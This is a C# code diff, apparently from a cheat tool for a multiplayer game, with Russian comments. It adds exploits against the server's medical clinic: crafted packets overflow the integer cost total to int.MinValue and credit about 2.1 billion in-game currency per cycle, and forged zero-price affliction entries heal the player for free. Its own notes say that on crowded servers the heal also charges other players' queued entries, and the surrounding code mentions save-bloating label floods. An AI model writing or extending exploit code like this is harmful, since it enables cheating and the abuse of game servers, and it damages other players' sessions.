@@ -157,6 +157,27 @@ namespace CSHUB.Modules
             },
             new Method
             {
+                Title = "💰 ОПТИМАЛЬНЫЙ ЦИКЛ (max +2.147B)",
+                Desc =
+"МАКСИМУМ денег за цикл: сумма 32770×65535 + 2048 = ровно\n" +
+"2,147,483,648 → totalCost = int.MinValue → +2,147,483,648 mk.\n" +
+"(Старый вариант 33000×65535 давал на 15M меньше — неоптимален.)\n\n" +
+"ОДИН пакет (32771 записей) + HEAL. Условия как у OVERFLOW.",
+                Exec = ExecClinicOptimal
+            },
+            new Method
+            {
+                Title = "💊 FREE HEAL (Price=0, без оверфлоу)",
+                Desc =
+"БЕЗ денег: твои РЕАЛЬНЫЕ раны + Price=0 → totalCost=0 →\n" +
+"TryPurchase(0)=true → лечит тебя БЕСПЛАТНО. Малые пакеты!\n" +
+"Это истинный корень 453 (бесплатная клиника).\n\n" +
+"⚠ На людном сервере HEAL платит и за ЧУЖИЕ записи в общей\n" +
+"очереди. Лучше на соло/дружном. Не в бою на аутпосте.",
+                Exec = ExecClinicFreeHeal
+            },
+            new Method
+            {
                 Title = "☣ LABEL FLOOD ×N меток (сейв-блоат)",
                 Desc =
 "cb.AddLabel() ×N — прямой клиентский API (правильные ID).\n" +
@@ -729,6 +750,11 @@ namespace CSHUB.Modules
         // Лёгкий ADD_PENDING (проверенный путь): perPacket аффликций в одном member
         private static void SendClinicAddPending(int perPacket, int idBase)
         {
+            SendClinicAddPending(perPacket, idBase, 65535);
+        }
+
+        private static void SendClinicAddPending(int perPacket, int idBase, ushort price)
+        {
             var afflictions = new MedicalClinic.NetAffliction[perPacket];
             for (int i = 0; i < perPacket; i++)
             {
@@ -737,7 +763,7 @@ namespace CSHUB.Modules
                     Identifier = "zzz_clinic_overflow".ToIdentifier(),
                     Strength = 0,
                     VitalityDecrease = 0,
-                    Price = 65535
+                    Price = price
                 };
             }
             var member = new MedicalClinic.NetCrewMember
@@ -832,6 +858,69 @@ namespace CSHUB.Modules
                 SendClinicHealPacket();
             }
             return "HEAL отправлен. Если очередь ≥32770 × 65535 — баланс += ~2.1B. НЕ в бою на аутпосте!";
+        }
+
+        // ОПТИМАЛЬНЫЙ цикл: сумма ровно 2^31 → int.MinValue → +2,147,483,648
+        private static string ExecClinicOptimal(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
+            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
+
+            int cycles = Math.Max(1, Math.Min(n, 3));
+            for (int c = 0; c < cycles; c++)
+            {
+                SendClinicAddPending(32770, 90000 + c * 10);        // 32770 × 65535
+                SendClinicAddPending(1, 90001 + c * 10, 2048);      // + 2048 = ровно 2^31
+                SendClinicHealPacket();
+            }
+            return "ОПТИМАЛЬНЫЙ цикл ×" + cycles + ": +" + (2147483648L * cycles) + " mk (теоретический максимум)";
+        }
+
+        // 💊 FREE HEAL: свои реальные раны с Price=0 — малые пакеты, без оверфлоу
+        private static string ExecClinicFreeHeal(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
+
+            Character me = Character.Controlled;
+            int infoId = 0;
+            try { infoId = me.Info.ID; } catch { }
+            if (infoId == 0) { return "нет CharacterInfo"; }
+
+            var seen = new HashSet<Identifier>();
+            var list = new List<MedicalClinic.NetAffliction>();
+            try
+            {
+                foreach (Affliction aff in me.CharacterHealth.GetAllAfflictions())
+                {
+                    if (aff == null || aff.Prefab == null) { continue; }
+                    if (!seen.Add(aff.Identifier)) { continue; }
+                    list.Add(new MedicalClinic.NetAffliction
+                    {
+                        Identifier = aff.Identifier,
+                        Strength = (ushort)Math.Ceiling(aff.Strength),
+                        VitalityDecrease = 0,
+                        Price = 0
+                    });
+                }
+            }
+            catch (Exception e) { return "afflictions fail: " + e.Message; }
+            if (list.Count == 0) { return "ран нет — лечить нечего"; }
+
+            var member = new MedicalClinic.NetCrewMember
+            {
+                CharacterInfoID = infoId,
+                Afflictions = ImmutableArray.Create(list.ToArray())
+            };
+            IWriteMessage add = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
+            add.WriteByte(ClinicHeaderAddPending);
+            ((INetSerializableStruct)member).Write(add);
+            GameMain.Client.ClientPeer.Send(add, DeliveryMethod.Reliable);
+
+            SendClinicHealPacket();
+            return "FREE HEAL: " + list.Count + " ран с Price=0 — вылечен за 0 mk";
         }
 
         private static string ExecSegmentTable(int n)
